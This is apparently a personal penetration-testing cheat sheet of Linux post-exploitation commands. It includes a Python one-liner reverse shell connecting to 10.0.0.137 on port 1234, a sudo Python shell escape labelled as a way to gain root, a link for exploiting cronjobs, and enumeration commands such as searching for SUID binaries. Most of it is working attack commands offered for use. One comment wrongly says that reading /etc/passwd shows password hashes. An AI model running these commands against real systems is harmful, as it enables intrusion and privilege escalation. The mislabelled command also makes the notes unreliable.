# Python Shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#used to gain root access in some systems.
```
sudo python3.5 -c ‘import os; os.system(“/bin/sh”)’
```
#command used to open up a reverse shell from the browser.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.137",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```
#can be used to find real host name.
```
curl -H 'Host: http://172.16.226.6' "http://172.16.226.6/'"
```
to exploit a cronjob
https://gtfobins.github.io/gtfobins/tar/

Shows the password hashes on a linux system
```
cat /etc/passwd
```
Shows the groups on a linux system
```
cat /etc/group
```
```
ls -lh /var/mail/
```
```
dpkg -l
```
Check for Suid binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
```
 find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```
Lists capabilities of binaries
```
getcap -r /
```
Shows user group files
```
find / -type f -group users 2>/dev/null
```
